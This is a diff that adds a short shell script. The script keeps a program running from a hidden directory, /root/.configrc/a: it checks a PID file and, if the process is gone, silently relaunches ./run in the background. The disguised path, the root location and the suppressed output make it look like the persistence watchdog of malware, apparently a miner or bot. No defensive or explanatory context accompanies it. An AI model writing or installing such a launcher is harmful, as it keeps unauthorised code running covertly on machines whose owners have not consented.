@@ -1,0 +1,10 @@
+#!/bin/sh
+cd /root/.configrc/a
+if test -r /root/.configrc/a/bash.pid; then
+pid=$(cat /root/.configrc/a/bash.pid)
+if $(kill -CHLD $pid >/dev/null 2>&1)
+then
+exit 0
+fi
+fi
+./run &>/dev/null
